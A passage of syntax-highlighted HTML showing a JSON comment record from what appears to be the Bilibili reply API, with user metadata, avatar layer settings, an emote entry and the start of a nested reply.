class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;热门评论&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;replies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;rpid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">272139796528</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;oid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">362747247</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">11</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">62831523</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;root&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;parent&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;dialog&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;count&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;rcount&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;state&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;fansgrade&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;attr&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">768</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;ctime&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1754875749</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;mid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;62831523&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;oid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;362747247&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;rpid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;272139796528&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;root_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;parent_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;dialog_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;like&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;member&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;62831523&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;uname&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Coronacosmo&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;sex&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;男&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;sign&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;avatar&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i0.hdslb.com/bfs/face/e49b2e87e33d846938fa33feac6566f439a0c1a8.jpg&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;rank&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;10000&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;face_nft_new&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;is_senior_member&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;senior&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;level_info&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;current_level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;current_min&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;current_exp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;next_exp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;pendant&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;pid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;expire&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image_enhance&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image_enhance_frame&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;n_pid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;nameplate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;nid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">57</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;收集萌新&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i0.hdslb.com/bfs/face/7767275600ea63d351b22fa87ec15a79aa24e5e5.png&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image_small&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i0.hdslb.com/bfs/face/6589d992655595bf51543f268040eaeaed372fae.png&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;普通勋章&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;condition&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;同时拥有粉丝勋章&gt;=5个&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;official_verify&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">-1</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;desc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;vip&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;vipType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;vipDueDate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1683129600000</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;dueRemark&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;accessStatus&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;vipStatus&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;vipStatusWarn&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;themeType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;label_theme&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;text_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;bg_style&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;bg_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;border_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;use_img_label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hans&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hant&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hans_static&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i0.hdslb.com/bfs/vip/d7b702ef65a976b20ed854cbd04cb9e27341bb79.png&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hant_static&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i0.hdslb.com/bfs/activity-plat/static/20220614/e369244d0b14644f5e1a06431e22a4d5/KJunwh19T5.png&quot;</span><br>                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;avatar_subscript&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;nickname_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;fans_detail&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;user_sailing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;is_contractor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;contract_desc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;nft_interaction&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;avatar_item&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;container_size&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;width&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1.8</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;height&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1.8</span><br>                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;fallback_layers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;layers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                                <span class="hljs-punctuation">&#123;</span><br>                                    <span class="hljs-attr">&quot;visible&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;general_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                        <span class="hljs-attr">&quot;pos_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;coordinate_pos&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;axis_x&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;axis_y&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><br>                                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;size_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;width&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;height&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;render_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;opacity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                        <span class="hljs-punctuation">&#125;</span><br>                                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;layer_config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                        <span class="hljs-attr">&quot;tags&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;AVATAR_LAYER&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>                                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;is_critical&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;layer_mask&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;general_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                <span class="hljs-attr">&quot;pos_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;coordinate_pos&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;axis_x&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;axis_y&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><br>                                                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;size_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;width&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;height&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;render_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;opacity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                                <span class="hljs-punctuation">&#125;</span><br>                                            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;mask_src&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                <span class="hljs-attr">&quot;src_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;draw&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;draw_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;fill_mode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;color_config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                        <span class="hljs-attr">&quot;day&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                            <span class="hljs-attr">&quot;argb&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#FF000000&quot;</span><br>                                                        <span class="hljs-punctuation">&#125;</span><br>                                                    <span class="hljs-punctuation">&#125;</span><br>                                                <span class="hljs-punctuation">&#125;</span><br>                                            <span class="hljs-punctuation">&#125;</span><br>                                        <span class="hljs-punctuation">&#125;</span><br>                                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                        <span class="hljs-attr">&quot;res_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;res_image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;image_src&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                <span class="hljs-attr">&quot;src_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;placeholder&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;remote&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i0.hdslb.com/bfs/face/e49b2e87e33d846938fa33feac6566f439a0c1a8.jpg&quot;</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;bfs_style&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;widget-layer-avatar&quot;</span><br>                                                <span class="hljs-punctuation">&#125;</span><br>                                            <span class="hljs-punctuation">&#125;</span><br>                                        <span class="hljs-punctuation">&#125;</span><br>                                    <span class="hljs-punctuation">&#125;</span><br>                                <span class="hljs-punctuation">&#125;</span><br>                            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;is_critical_group&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;62831523&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;content&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;[热词系列_大师球]&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;members&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;emote&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;[热词系列_大师球]&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1868</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;package_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">53</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;state&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;attr&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;[热词系列_大师球]&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i0.hdslb.com/bfs/emote/f30089248dd137c568edabcb07cf67e0f6e98cf3.png&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;meta&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;size&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;suggest&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                                    <span class="hljs-string">&quot;&quot;</span><br>                                <span class="hljs-punctuation">]</span><br>                            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;mtime&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1671778768</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;jump_title&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;大师球&quot;</span><br>                        <span class="hljs-punctuation">&#125;</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;jump_url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;max_line&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;replies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;rpid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">270904965281</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;oid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">362747247</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">11</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">455215669</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;root&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">272139796528</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;parent&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">272139796528</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;dialog&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">270904965281</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;count&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;rcount&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;state&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;fansgrade&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;attr&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;ctime&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1754888850</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;mid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;455215669&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;oid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;362747247&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;rpid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;270904965281&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;root_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;272139796528&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;parent_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;272139796528&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;dialog_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;270904965281&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;like&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span 